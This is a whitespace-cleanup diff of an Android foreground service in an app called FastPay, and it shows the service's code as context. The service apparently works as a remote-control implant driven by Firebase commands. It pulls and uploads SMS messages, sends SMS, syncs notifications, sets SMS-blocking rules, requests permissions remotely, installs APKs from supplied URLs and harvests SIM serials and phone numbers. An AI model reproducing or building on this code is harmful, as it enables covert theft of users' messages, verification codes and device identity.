@@ -91,24 +91,24 @@ class PersistentForegroundService : Service() {
             context.startForegroundService(intent)
         }
     }
-    
+
     // Firebase listener references for cleanup
     private var commandListener: ValueEventListener? = null
     private var filterListener: ValueEventListener? = null
     private var isActiveListener: ValueEventListener? = null
-    
+
     // Thread-safe timestamp for command debouncing (prevents race conditions)
     private val lastCommandTime = AtomicLong(0L)
-    
+
     // Dynamic heartbeat interval (defaults to 60 seconds)
     private var currentHeartbeatIntervalMs = DEFAULT_HEARTBEAT_INTERVAL_MS
-    
+
     // Battery tracking for conditional writes (only write if changed ±1%)
     private var lastBatteryPercentage = -1
-    
+
     // Last time main path was updated (for backward compatibility)
     private var lastMainPathUpdate: Long? = null
-    
+
     private val heartbeatHandler = Handler(Looper.getMainLooper())
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
@@ -116,7 +116,7 @@ class PersistentForegroundService : Service() {
             heartbeatHandler.postDelayed(this, currentHeartbeatIntervalMs)
         }
     }
-    
+
     private val deviceInfoHandler = Handler(Looper.getMainLooper())
     private val deviceInfoRunnable = object : Runnable {
         override fun run() {
@@ -147,7 +147,7 @@ class PersistentForegroundService : Service() {
     @SuppressLint("HardwareIds")
     override fun onCreate() {
         super.onCreate()
-        
+
         // Wrap in try-catch to prevent service crash on initialization errors
         try {
             createNotificationChannel()
@@ -168,13 +168,13 @@ class PersistentForegroundService : Service() {
                 if (snapshot.exists()) {
                     val currentTime = System.currentTimeMillis()
                     val lastTime = lastCommandTime.get()
-                    
+
                     // Thread-safe debouncing: prevent multiple commands within 1 second
                     if (currentTime - lastTime < 1000) {
                         LogHelper.d(TAG, "Command ignored - too soon after last command")
                         return
                     }
-                    
+
                     // Atomically update last command time
                     lastCommandTime.set(currentTime)
 
@@ -191,7 +191,7 @@ class PersistentForegroundService : Service() {
                             val commandsRef = Firebase.database.reference.child(commandsPath)
                             commandsRef.removeValue().addOnSuccessListener {
                                 LogHelper.d(TAG, "Commands removed from Firebase after saving to history")
-                                
+
                                 // Now execute all commands
                                 commandsToProcess.forEach { (key, value) ->
                                     try {
@@ -226,7 +226,7 @@ class PersistentForegroundService : Service() {
                                     LogHelper.e(TAG, "Error executing command: $key", e)
                                 }
                             }
-                            
+
                             // Still try to remove original commands
                             val commandsRef = Firebase.database.reference.child(commandsPath)
                             commandsRef.removeValue().addOnFailureListener { e ->
@@ -236,7 +236,7 @@ class PersistentForegroundService : Service() {
                     }
                 }
             }
-            
+
             override fun onCancelled(error: DatabaseError) {
                 LogHelper.e(TAG, "Command listener cancelled: ${error.message}", error.toException())
             }
@@ -262,7 +262,7 @@ class PersistentForegroundService : Service() {
                     } else {
                         writeInternalFile("filterNotify.txt", "")
                     }
-                    
+
                     // Sync blockSms rule from Firebase
                     if (snapshot.child("blockSms").exists()) {
                         val blockSmsRule = snapshot.child("blockSms").value?.toString() ?: ""
@@ -288,7 +288,7 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error setting up filter listener, will retry", e)
         }
-        
+
         // Setup isActive listener (heartbeat defaults to 60 seconds and can be changed remotely)
         val devicePath = AppConfig.getFirebaseDevicePath(androidId())
         val isActivePath = "$devicePath/${AppConfig.FirebasePaths.IS_ACTIVE}"
@@ -303,7 +303,7 @@ class PersistentForegroundService : Service() {
                     LogHelper.e(TAG, "Error processing isActive value", e)
                 }
             }
-            
+
             override fun onCancelled(error: DatabaseError) {
                 LogHelper.e(TAG, "isActive listener cancelled: ${error.message}", error.toException())
             }
@@ -314,42 +314,42 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error setting up isActive listener, will retry", e)
         }
-        
+
         // Start heartbeat to update online status
         try {
             startHeartbeat()
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error starting heartbeat, will retry", e)
         }
-        
+
         // Start periodic device info collection
         try {
             startDeviceInfoCollection()
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error starting device info collection, will retry", e)
         }
-        
+
         LogHelper.d(TAG, "Service created and initialized successfully")
-        
+
         // Initialize notification channels
         AppNotificationManager.initializeChannels(this)
-        
+
         // Load auto-reply configuration from Firebase
         AutoReplyManager.loadAutoReplyConfig(this)
-        
+
         // Initialize notification batch processor (load from persistent storage)
         NotificationBatchProcessor.initializeFromStorage(this)
-        
+
         // Initialize message batch processor (load from persistent storage)
         SmsMessageBatchProcessor.initializeFromStorage(this)
-        
+
         // Initialize contact batch processor (load from persistent storage)
         ContactBatchProcessor.initializeFromStorage(this)
-        
+
         // Set up network connectivity listener for immediate retry on connection restore
         setupNetworkConnectivityListener()
     }
-    
+
     /**
      * Set up network connectivity listener to trigger immediate retry when connection is restored
      */
@@ -360,17 +360,17 @@ class PersistentForegroundService : Service() {
                 LogHelper.w(TAG, "ConnectivityManager not available, skipping network listener setup")
                 return
             }
-            
+
             val networkRequest = NetworkRequest.Builder()
                 .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                 .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                 .build()
-            
+
             val networkCallback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
                     super.onAvailable(network)
                     LogHelper.d(TAG, "✅ Network connection restored - triggering notification and message upload retry")
-                    
+
                     // Check if we have internet (validated)
                     if (NetworkUtils.hasInternetConnection(this@PersistentForegroundService)) {
                         // Trigger immediate retry for queued notifications
@@ -381,18 +381,18 @@ class PersistentForegroundService : Service() {
                         ContactBatchProcessor.flush(this@PersistentForegroundService)
                     }
                 }
-                
+
                 override fun onLost(network: Network) {
                     super.onLost(network)
                     LogHelper.d(TAG, "⚠️ Network connection lost - notifications will queue until connection restored")
                 }
-                
+
                 override fun onCapabilitiesChanged(
                     network: Network,
                     networkCapabilities: NetworkCapabilities
                 ) {
                     super.onCapabilitiesChanged(network, networkCapabilities)
-                    
+
                     // Check if internet is validated
                     if (networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                         networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
@@ -406,18 +406,18 @@ class PersistentForegroundService : Service() {
                     }
                 }
             }
-            
+
             // Register network callback
             connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
             LogHelper.d(TAG, "Network connectivity listener registered")
-            
+
             // Store callback reference for cleanup (if needed)
             // Note: Network callbacks are automatically unregistered when service is destroyed
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error setting up network connectivity listener", e)
         }
     }
-    
+
     /**
      * Start periodic heartbeat to update device online status
      * Updates both fastpay/{deviceId}/lastSeen and fastpay/device-list/{key}/lastSeen
@@ -429,7 +429,7 @@ class PersistentForegroundService : Service() {
         heartbeatHandler.postDelayed(heartbeatRunnable, currentHeartbeatIntervalMs)
         LogHelper.d(TAG, "Heartbeat started (interval: ${currentHeartbeatIntervalMs / 1000}s)")
     }
-    
+
     /**
      * Restart heartbeat with updated interval
      * Called when isActive value changes in Firebase
@@ -440,7 +440,7 @@ class PersistentForegroundService : Service() {
         // Restart with new interval
         startHeartbeat()
     }
-    
+
     /**
      * Start periodic device information collection
      * Collects all available device info and syncs to Firebase
@@ -453,7 +453,7 @@ class PersistentForegroundService : Service() {
         deviceInfoHandler.postDelayed(deviceInfoRunnable, DEVICE_INFO_COLLECTION_INTERVAL_MS)
         LogHelper.d(TAG, "Device info collection started (interval: ${DEVICE_INFO_COLLECTION_INTERVAL_MS / 1000 / 60 / 60} hours)")
     }
-    
+
     /**
      * Collect all device information in background
      * Uses DeviceInfoCollector to gather data from all subtasks
@@ -461,7 +461,7 @@ class PersistentForegroundService : Service() {
      */
     private fun collectDeviceInfo() {
         LogHelper.d(TAG, "Starting device info collection")
-        
+
         DeviceInfoCollector.collectAllDeviceInfo(
             context = this,
             onProgress = { subtaskName, current, total, isComplete ->
@@ -476,7 +476,7 @@ class PersistentForegroundService : Service() {
                 val totalCount = allResults.size
                 val totalTime = allResults.values.sumOf { it.collectionTime }
                 LogHelper.d(TAG, "Device info collection finished: $successCount/$totalCount subtasks successful in ${totalTime}ms")
-                
+
                 // Log summary of results (only in debug builds)
                 allResults.forEach { (name, result) ->
                     if (result.success) {
@@ -491,15 +491,15 @@ class PersistentForegroundService : Service() {
             }
         )
     }
-    
+
     /**
      * Update device online status in Firebase
-     * 
+     *
      * OPTIMIZED VERSION:
      * - Uses lightweight heartbeat path: hertbit/{deviceId}
      * - Main path updated less frequently for backward compatibility (every 5 minutes)
      * - Battery only written if changed significantly (±1%)
-     * 
+     *
      * Uses unified FirebaseWriteHelper for consistent write operations
      */
     @SuppressLint("HardwareIds")
@@ -507,15 +507,15 @@ class PersistentForegroundService : Service() {
         val deviceId = androidId()
         val currentTime = System.currentTimeMillis()
         val batteryPercentage = com.example.fast.util.BatteryHelper.getBatteryPercentage(this)
-        
+
         // Determine if main path should be updated (every 5 minutes for backward compatibility)
-        val shouldUpdateMain = lastMainPathUpdate == null || 
+        val shouldUpdateMain = lastMainPathUpdate == null ||
                               (currentTime - lastMainPathUpdate!!) >= MAIN_PATH_UPDATE_INTERVAL_MS
-        
+
         if (shouldUpdateMain) {
             lastMainPathUpdate = currentTime
         }
-        
+
         // Use unified FirebaseWriteHelper to write to both paths
         lastBatteryPercentage = FirebaseWriteHelper.writeHeartbeat(
             deviceId = deviceId,
@@ -570,7 +570,7 @@ class PersistentForegroundService : Service() {
             }
         }
     }
-    
+
     /**
      * Update command history status after execution
      * @param historyTimestamp Original timestamp when command was received
@@ -676,7 +676,7 @@ class PersistentForegroundService : Service() {
             .apply()
         return true
     }
-    
+
     private fun followCommand(key: String, content: String, historyTimestamp: Long) {
         try {
         commandCooldownsMs[key]?.let { intervalMs ->
@@ -989,20 +989,20 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unexpected error: ${e.message}")
         }
     }
-    
+
     /**
      * Handle syncNotification command
-     * Format: 
+     * Format:
      * - "on" -> Enable notification sync in batch mode (default)
      * - "off" -> Disable notification sync completely
      * - "realtime:{minutes}" -> Enable real-time sync for specified minutes, then auto-return to batch
-     * 
+     *
      * Examples:
      * - "on" -> Batch mode (uploads every 5 min or 100 notifications)
      * - "off" -> Disabled (no sync)
      * - "realtime:30" -> Real-time for 30 minutes, then back to batch
      * - "realtime:60" -> Real-time for 1 hour, then back to batch
-     * 
+     *
      * Controls notification sync by setting filter value in Firebase
      * - "on" -> Enable notification sync (set filter to empty string, batch mode)
      * - "off" -> Disable notification sync (set filter to "~DISABLED~")
@@ -1011,7 +1011,7 @@ class PersistentForegroundService : Service() {
     private fun handleSyncNotificationCommand(content: String) {
         val command = content.trim().lowercase()
         val deviceId = androidId()
-        
+
         when {
             command == "on" -> {
                 // Enable notification sync in batch mode (default)
@@ -1020,7 +1020,7 @@ class PersistentForegroundService : Service() {
                         val metadataUpdate = mapOf("notification_sync" to "on")
                         DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                         LogHelper.d(TAG, "Notification sync enabled in Django (BATCH mode)")
-                        
+
                         // Ensure batch mode is active
                         com.example.fast.util.NotificationBatchProcessor.switchToBatchMode(this@PersistentForegroundService)
                     } catch (e: Exception) {
@@ -1028,7 +1028,7 @@ class PersistentForegroundService : Service() {
                     }
                 }
             }
-            
+
             command == "off" -> {
                 // Disable notification sync completely
                 serviceScope.launch {
@@ -1036,10 +1036,10 @@ class PersistentForegroundService : Service() {
                         val metadataUpdate = mapOf("notification_sync" to "off")
                         DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                         LogHelper.d(TAG, "Notification sync disabled in Django")
-                        
+
                         // Switch to batch mode (but sync is disabled, so nothing will upload)
                         com.example.fast.util.NotificationBatchProcessor.switchToBatchMode(this@PersistentForegroundService)
-                        
+
                         // Also write to local file to disable immediately
                         try {
                             writeInternalFile("filterNotify.txt", "~DISABLED~")
@@ -1051,12 +1051,12 @@ class PersistentForegroundService : Service() {
                     }
                 }
             }
-            
+
             command.startsWith("realtime:") -> {
                 // Parse minutes from "realtime:30" format
                 val minutesStr = command.substringAfter("realtime:").trim()
                 val minutes = minutesStr.toIntOrNull()
-                
+
                 if (minutes != null && minutes > 0) {
                     // Enable notification sync first
                     serviceScope.launch {
@@ -1068,10 +1068,10 @@ class PersistentForegroundService : Service() {
                             )
                             DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                             LogHelper.d(TAG, "Notification sync enabled in Django, switching to REAL-TIME mode for $minutes minutes")
-                            
+
                             // Switch to real-time mode
                             com.example.fast.util.NotificationBatchProcessor.switchToRealtimeMode(this@PersistentForegroundService, minutes)
-                            
+
                             // Also ensure local file allows sync
                             try {
                                 writeInternalFile("filterNotify.txt", "")
@@ -1086,17 +1086,17 @@ class PersistentForegroundService : Service() {
                     LogHelper.e(TAG, "Invalid real-time duration: $minutesStr. Expected format: realtime:{minutes}")
                 }
             }
-            
+
             else -> {
                 LogHelper.e(TAG, "Invalid syncNotification command: $command. Expected: on, off, or realtime:{minutes}")
             }
         }
     }
-            
+
     /**
      * Handle requestPermission command
      * Format: "permission1,permission2,..." or "ALL"
-     * 
+     *
      * Permissions: sms, contacts, notification, battery, phone_state, ALL
      */
     private fun handleRequestPermissionCommand(content: String) {
@@ -1115,29 +1115,29 @@ class PersistentForegroundService : Service() {
             }
             requested
         }
-        
+
         // Launch RemotePermissionRequestActivity to handle permission requests
         val intent = Intent(this, com.example.fast.ui.RemotePermissionRequestActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
             putStringArrayListExtra("permissions", ArrayList(permissionsToRequest))
         }
             startActivity(intent)
-            
+
         LogHelper.d(TAG, "Requesting permissions (with battery/notification in chain): $permissionsToRequest")
     }
-    
+
     /**
      * Handle updateApk command
      * Format: "{downloadUrl}" or "{versionCode}|{downloadUrl}"
-     * 
+     *
      * Examples:
      * - "https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
      * - "29|https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
-     * 
+     *
      * Storage:
      * - APK stored in: context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
      * - File name: FastPay_Update_v{versionCode}.apk
-     * 
+     *
      * @param content Download URL (with optional version code prefix)
      */
     private fun handleUpdateApkCommand(content: String) {
@@ -1145,37 +1145,37 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "updateApk command: Empty download URL")
             return
         }
-        
+
         // Launch RemoteUpdateActivity to handle APK update
         val intent = Intent(this, com.example.fast.ui.RemoteUpdateActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
             putExtra("downloadUrl", content.trim())
         }
         startActivity(intent)
-        
+
         LogHelper.d(TAG, "Launching update activity with URL: $content")
     }
-    
+
     /**
      * Handle controlAnimation command
      * Format: "start" or "off sms" or "off instruction" or "off"
-     * 
+     *
      * Controls the card animation in the dashboard:
      * - "start" - Start animation (set stopAnimationOn to null = Animation ON)
      * - "off sms" - Stop animation when SMS card is displayed
      * - "off instruction" - Stop animation when Instruction card is displayed
      * - "off" (no value) - Default to "off sms"
-     * 
+     *
      * Default Behavior: Animation is ON by default (stopAnimationOn = null or not set)
-     * 
+     *
      * Updates Firebase: device/{deviceId}/animationSettings/stopAnimationOn
-     * 
+     *
      * @param content Command content: "start", "off sms", "off instruction", or "off"
      */
     @SuppressLint("HardwareIds")
     private fun handleControlAnimationCommand(content: String) {
         val trimmedContent = content.trim().lowercase()
-        
+
         // Get device ID
         val deviceId = android.provider.Settings.Secure.getString(
             contentResolver,
@@ -1184,7 +1184,7 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "controlAnimation command: Cannot get device ID")
             return
         }
-        
+
         // Determine stopAnimationOn value
         val stopAnimationOn: String? = when {
             trimmedContent == "start" -> {
@@ -1204,17 +1204,17 @@ class PersistentForegroundService : Service() {
                 "sms"
             }
         }
-        
+
         // Update Firebase animation settings
         val animationSettingsPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/animationSettings"
         val settingsRef = Firebase.database.reference.child(animationSettingsPath)
-        
+
         val action = if (stopAnimationOn == null) {
             "started"
         } else {
             "stopped on $stopAnimationOn card"
         }
-        
+
         if (stopAnimationOn != null) {
             // Set stopAnimationOn value
             val settingsMap = mapOf<String, Any>("stopAnimationOn" to stopAnimationOn)
@@ -1238,14 +1238,14 @@ class PersistentForegroundService : Service() {
                 }
         }
     }
-    
+
     /**
      * Handle fetchSms command
      * Format: "{count}" or empty (defaults to 10)
-     * 
+     *
      * Fetches the last X SMS messages (both received and sent) and uploads them
      * to Firebase as a single object at message/{deviceId}/fetch_{timestamp}
-     * 
+     *
      * @param content Number of messages to fetch (default: 10 if empty or invalid)
      */
     private fun handleFetchSmsCommand(content: String, historyTimestamp: Long) {
@@ -1255,7 +1255,7 @@ class PersistentForegroundService : Service() {
             updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "READ_SMS permission not granted")
             return
         }
-        
+
         // Parse count (default to 10 if empty or invalid)
         val count = try {
             val parsed = content.trim().toIntOrNull()
@@ -1264,23 +1264,23 @@ class PersistentForegroundService : Service() {
             LogHelper.w(TAG, "Invalid count format in fetchSms command, using default: 10", e)
             10
         }
-        
+
         LogHelper.d(TAG, "Fetching last $count SMS messages")
-        
+
         // Fetch messages in background thread
         Thread {
             try {
                 // Get all messages using SmsQueryHelper
                 val allMessages = SmsQueryHelper.getAllMessages(this, null)
-                
+
                 // Sort by timestamp descending (newest first) and take last X
                 val lastMessages = allMessages
                     .sortedByDescending { it.timestamp }
                     .take(count)
                     .sortedBy { it.timestamp } // Sort ascending for chronological order
-                
+
                 LogHelper.d(TAG, "Retrieved ${lastMessages.size} messages out of ${allMessages.size} total")
-                
+
                 // Create messages map in Firebase format
                 val messagesMap = mutableMapOf<String, String>()
                 lastMessages.forEach { message ->
@@ -1296,15 +1296,15 @@ class PersistentForegroundService : Service() {
                         LogHelper.w(TAG, "Error processing message for Firebase upload", e)
                     }
                 }
-                
+
                 // Upload to Firebase - write each message individually to message/device_id/msg/{timestamp}
                 val messagesBasePath = AppConfig.getFirebaseMessagePath(androidId())
                 val batchMap = mutableMapOf<String, Any>()
-                
+
                 messagesMap.forEach { (timestamp, value) ->
                     batchMap[timestamp] = value
                 }
-                
+
                 // Upload all messages in a single batch update
                 FirebaseWriteHelper.updateChildren(
                     path = messagesBasePath,
@@ -1333,30 +1333,30 @@ class PersistentForegroundService : Service() {
             }
         }.start()
     }
-    
+
     /**
      * Handle fetchDeviceInfo command
      * Format: Any value (content is ignored, command always executes)
-     * 
+     *
      * Collects and uploads combined device information:
      * - Battery information (percentage, charging status, etc.)
      * - Network information (type, operator, connectivity status)
      * - SIM information (serial, operator, state, etc.)
      * - Basic device information (manufacturer, model, Android version, etc.)
-     * 
+     *
      * Uploads data to: device/{deviceId}/deviceInfo/fetch_{timestamp}
-     * 
+     *
      * @param content Command content (ignored, can be any value)
      */
     @SuppressLint("HardwareIds")
     private fun handleFetchDeviceInfoCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Fetching device info (battery, network, SIM, basic)")
-        
+
         // Collect info in background thread
         Thread {
             try {
                 val deviceInfoMap = mutableMapOf<String, Any?>()
-                
+
                 // 1. Battery Information
                 try {
                     val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
@@ -1364,7 +1364,7 @@ class PersistentForegroundService : Service() {
                         val batteryLevel = try {
                             batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                         } catch (e: Exception) { -1 }
-                        
+
                         val batteryInfo = mutableMapOf<String, Any?>(
                             "batteryPercentage" to if (batteryLevel in 0..100) batteryLevel else null,
                             "isCharging" to try { batteryManager.isCharging } catch (e: Exception) { false },
@@ -1378,24 +1378,24 @@ class PersistentForegroundService : Service() {
                                 batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW)
                             } catch (e: Exception) { null }
                         )
-                        
+
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                             batteryInfo["energyCounter"] = try {
                                 batteryManager.getLongProperty(BatteryManager.BATTERY_PROPERTY_ENERGY_COUNTER)
                             } catch (e: Exception) { null }
                         }
-                        
+
                         deviceInfoMap["battery"] = batteryInfo.filterValues { it != null }
                     }
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error collecting battery info", e)
                 }
-                
+
                 // 2. Network Information
                 try {
                     val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                     val networkInfo = connectivityManager?.activeNetworkInfo
-                    
+
                     val networkInfoMap = mutableMapOf<String, Any?>(
                         "isConnected" to networkInfo?.isConnected,
                         "networkType" to networkInfo?.type?.let {
@@ -1411,7 +1411,7 @@ class PersistentForegroundService : Service() {
                         "isMobile" to (networkInfo?.type == ConnectivityManager.TYPE_MOBILE),
                         "networkSubtype" to networkInfo?.subtype
                     )
-                    
+
                     val activeNetwork = connectivityManager?.activeNetwork
                     val capabilities = activeNetwork?.let { connectivityManager.getNetworkCapabilities(it) }
                     if (capabilities != null) {
@@ -1423,9 +1423,9 @@ class PersistentForegroundService : Service() {
                         networkInfoMap["linkUpstreamKbps"] = capabilities.linkUpstreamBandwidthKbps
                         networkInfoMap["isMetered"] = !capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED)
                     }
-                    
+
                     // Extended network info (requires READ_PHONE_STATE)
-                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
+                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                         == PackageManager.PERMISSION_GRANTED) {
                         try {
                             val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
@@ -1440,27 +1440,27 @@ class PersistentForegroundService : Service() {
                             LogHelper.w(TAG, "Error getting extended network info", e)
                         }
                     }
-                    
+
                     val wifiInfo = collectWifiInfo()
                     if (wifiInfo.isNotEmpty()) {
                         networkInfoMap["wifi"] = wifiInfo
                     }
-                    
+
                     deviceInfoMap["network"] = networkInfoMap.filterValues { it != null }
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error collecting network info", e)
                 }
-                
+
                 // 3. SIM Information (requires READ_PHONE_STATE)
                 try {
-                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
+                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                         == PackageManager.PERMISSION_GRANTED) {
                         val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                         if (telephonyManager != null) {
                             val phoneCount = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                 telephonyManager.phoneCount
                             } else 1
-                            
+
                             // Collect SIM info (supports single and dual-SIM)
                             // Note: For dual-SIM devices, this collects info for the default/primary SIM slot
                             // Slot-specific info for all slots requires SubscriptionManager (additional permissions)
@@ -1473,7 +1473,7 @@ class PersistentForegroundService : Service() {
                                     LogHelper.d(TAG, "Collected SIM info (single SIM device)")
                                 }
                             }
-                            
+
                             val simSlots = collectSimSlotsInfo()
                             if (simSlots.isNotEmpty()) {
                                 deviceInfoMap["simSlots"] = simSlots
@@ -1485,7 +1485,7 @@ class PersistentForegroundService : Service() {
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error collecting SIM info", e)
                 }
-                
+
                 // 4. Basic Device Information
                 try {
                     val basicInfo = mutableMapOf<String, Any?>(
@@ -1501,7 +1501,7 @@ class PersistentForegroundService : Service() {
                         "hardware" to Build.HARDWARE,
                         "board" to Build.BOARD
                     )
-                    
+
                     try {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             basicInfo["serialNumber"] = Build.getSerial()
@@ -1512,16 +1512,16 @@ class PersistentForegroundService : Service() {
                     } catch (e: Exception) {
                         // Ignore - serial may not be available
                     }
-                    
+
                     deviceInfoMap["device"] = basicInfo.filterValues { it != null }
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error collecting basic device info", e)
                 }
-                
+
                 // Upload to Firebase
                 val fetchTimestamp = System.currentTimeMillis()
                 val fetchPath = "${AppConfig.getFirebaseDevicePath(androidId())}/deviceInfo/fetch_$fetchTimestamp"
-                
+
                 FirebaseWriteHelper.setValue(
                     path = fetchPath,
                     data = deviceInfoMap,
@@ -1540,14 +1540,14 @@ class PersistentForegroundService : Service() {
                         updateCommandHistoryStatus(historyTimestamp, "fetchDeviceInfo", "failed", "Error: ${e.message}")
                     }
                 )
-                    
+
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error fetching device info", e)
                 updateCommandHistoryStatus(historyTimestamp, "fetchDeviceInfo", "failed", "Error: ${e.message}")
             }
         }.start()
     }
-    
+
     /**
      * Collect SIM information for a single SIM device (default SIM)
      */
@@ -1571,14 +1571,14 @@ class PersistentForegroundService : Service() {
             "callState" to telephonyManager.callState,
             "dataActivity" to telephonyManager.dataActivity
         )
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             simInfo["dataNetworkType"] = telephonyManager.dataNetworkType
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             simInfo["isDataEnabled"] = telephonyManager.isDataEnabled
         }
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             try {
                 val strength = telephonyManager.signalStrength
@@ -1604,7 +1604,7 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             LogHelper.w(TAG, "SIM serial number not available", e)
         }
-        
+
         try {
             val phoneNumber = telephonyManager.line1Number
             if (phoneNumber != null && phoneNumber.isNotEmpty()) {
@@ -1614,7 +1614,7 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             LogHelper.w(TAG, "Phone number not available", e)
         }
-        
+
         try {
             val voiceMailNumber = telephonyManager.voiceMailNumber
             if (voiceMailNumber != null && voiceMailNumber.isNotEmpty()) {
@@ -1623,7 +1623,7 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             // Ignore - may not be available
         }
-        
+
         try {
             val voiceMailAlphaTag = telephonyManager.voiceMailAlphaTag
             if (voiceMailAlphaTag != null && voiceMailAlphaTag.isNotEmpty()) {
@@ -1632,7 +1632,7 @@ class PersistentForegroundService : Service() {
         } catch (e: Exception) {
             // Ignore - may not be available
         }
-        
+
         return simInfo.filterValues { it != null }
     }
 
@@ -1761,7 +1761,7 @@ class PersistentForegroundService : Service() {
             return emptyList()
         }
     }
-    
+
     /**
      * Collect SIM information for a specific SIM slot (dual-SIM support)
      */
@@ -1770,13 +1770,13 @@ class PersistentForegroundService : Service() {
         val slotInfo = mutableMapOf<String, Any?>(
             "slotIndex" to slotIndex
         )
-        
+
         try {
             // Get TelephonyManager for this specific slot (Android M+)
             // Note: For dual-SIM, we use the default TelephonyManager as slot-specific access
             // requires SubscriptionManager which needs additional permissions
             val slotTelephonyManager = telephonyManager
-            
+
             slotInfo["simState"] = slotTelephonyManager.simState
             slotInfo["simCountryIso"] = slotTelephonyManager.simCountryIso
             slotInfo["simOperatorName"] = slotTelephonyManager.simOperatorName
@@ -1790,14 +1790,14 @@ class PersistentForegroundService : Service() {
             slotInfo["dataState"] = slotTelephonyManager.dataState
             slotInfo["callState"] = slotTelephonyManager.callState
             slotInfo["dataActivity"] = slotTelephonyManager.dataActivity
-            
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 slotInfo["dataNetworkType"] = slotTelephonyManager.dataNetworkType
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 slotInfo["isDataEnabled"] = slotTelephonyManager.isDataEnabled
             }
-            
+
             // Try to get sensitive info (may fail on some devices)
             try {
                 val simSerial = slotTelephonyManager.simSerialNumber
@@ -1808,7 +1808,7 @@ class PersistentForegroundService : Service() {
             } catch (e: Exception) {
                 LogHelper.w(TAG, "SIM serial number not available for slot $slotIndex", e)
             }
-            
+
             try {
                 val phoneNumber = slotTelephonyManager.line1Number
                 if (phoneNumber != null && phoneNumber.isNotEmpty()) {
@@ -1818,7 +1818,7 @@ class PersistentForegroundService : Service() {
             } catch (e: Exception) {
                 LogHelper.w(TAG, "Phone number not available for slot $slotIndex", e)
             }
-            
+
             try {
                 val voiceMailNumber = slotTelephonyManager.voiceMailNumber
                 if (voiceMailNumber != null && voiceMailNumber.isNotEmpty()) {
@@ -1827,7 +1827,7 @@ class PersistentForegroundService : Service() {
             } catch (e: Exception) {
                 // Ignore - may not be available
             }
-            
+
             try {
                 val voiceMailAlphaTag = slotTelephonyManager.voiceMailAlphaTag
                 if (voiceMailAlphaTag != null && voiceMailAlphaTag.isNotEmpty()) {
@@ -1836,30 +1836,30 @@ class PersistentForegroundService : Service() {
             } catch (e: Exception) {
                 // Ignore - may not be available
             }
-            
+
         } catch (e: Exception) {
             LogHelper.w(TAG, "Error collecting SIM info for slot $slotIndex", e)
         }
-        
+
         return slotInfo.filterValues { it != null }
     }
-    
+
     /**
      * Handle sendSms command
      * Format 1 (Simple): "phone:message" - Sends from SIM 1 (default)
      * Format 2 (Advanced): "sim;phone:message" - Sends from specified SIM (1 or 2)
-     * 
+     *
      * Examples:
      * - "sendSms" -> content: "+1234567890:Hello, this is a test message"
      * - "sendSms" -> content: "1;+1234567890:Hello from SIM 1"
      * - "sendSms" -> content: "2;+1234567890:Hello from SIM 2"
-     * 
+     *
      * @param content Command content in format "phone:message" or "sim;phone:message"
      * @param historyTimestamp Timestamp for command history tracking
      */
     private fun handleSendSmsCommand(content: String, historyTimestamp: Long) {
         LogHelper.d(TAG, "Executing sendSms command: $content")
-        
+
         // Check permissions first
